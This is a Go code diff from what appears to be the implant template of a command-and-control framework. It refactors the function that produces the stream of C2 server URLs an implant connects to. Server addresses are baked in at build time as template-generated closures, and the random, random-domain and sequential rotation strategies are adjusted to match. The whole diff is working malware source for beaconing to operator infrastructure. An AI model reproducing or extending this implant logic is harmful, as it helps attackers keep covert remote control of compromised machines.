@@ -36,10 +36,18 @@ const (
 )
 
 // C2Generator - Creates a stream of C2 URLs based on a connection strategy
-func C2Generator(c2Servers []string, abort <-chan struct{}) <-chan *url.URL {
+func C2Generator(abort <-chan struct{}) <-chan *url.URL {
 	// {{if .Config.Debug}}
 	log.Printf("Starting c2 url generator ({{.Config.ConnectionStrategy}}) ...")
 	// {{end}}
+
+	c2Servers := []func() string{}
+	// {{range $index, $value := .Config.C2}}
+	c2Servers = append(c2Servers, func() string {
+		return "{{$value}}" // {{$index}}
+	})
+	// {{end}} - range
+
 	generator := make(chan *url.URL)
 	go func() {
 		defer close(generator)
@@ -48,16 +56,16 @@ func C2Generator(c2Servers []string, abort <-chan struct{}) <-chan *url.URL {
 			var next string
 			switch "{{.Config.ConnectionStrategy}}" {
 			case strategyRandom: // Random
-				next = c2Servers[insecureRand.Intn(len(c2Servers))]
+				next = c2Servers[insecureRand.Intn(len(c2Servers))]()
 			case strategyRandomDomain: // Random Domain
 				// Select the next sequential C2 then use it's protocol to make a random
 				// selection from all C2s that share it's protocol.
-				next = c2Servers[insecureRand.Intn(len(c2Servers))]
+				next = c2Servers[insecureRand.Intn(len(c2Servers))]()
 				next = randomCCDomain(c2Servers, next)
 			case strategySequential: // Sequential
-				next = c2Servers[c2Counter%uint(len(c2Servers))]
+				next = c2Servers[c2Counter%uint(len(c2Servers))]()
 			default:
-				next = c2Servers[c2Counter%uint(len(c2Servers))]
+				next = c2Servers[c2Counter%uint(len(c2Servers))]()
 			}
 			c2Counter++
 			if ^uint(0) < c2Counter {
@@ -90,15 +98,15 @@ func C2Generator(c2Servers []string, abort <-chan struct{}) <-chan *url.URL {
 }
 
 // randomCCDomain - Random selection within a protocol
-func randomCCDomain(ccServers []string, next string) string {
+func randomCCDomain(ccServers []func() string, next string) string {
 	uri, err := url.Parse(next)
 	if err != nil {
 		return next
 	}
-	pool := []string{}
+	pool := []func() string{}
 	protocol := uri.Scheme
 	for _, cc := range ccServers {
-		uri, err := url.Parse(cc)
+		uri, err := url.Parse(cc())
 		if err != nil {
 			continue
 		}
@@ -106,7 +114,7 @@ func randomCCDomain(ccServers []string, next string) string {
 			pool = append(pool, cc)
 		}
 	}
-	return pool[insecureRand.Intn(len(pool))]
+	return pool[insecureRand.Intn(len(pool))]()
 }
 
 var (
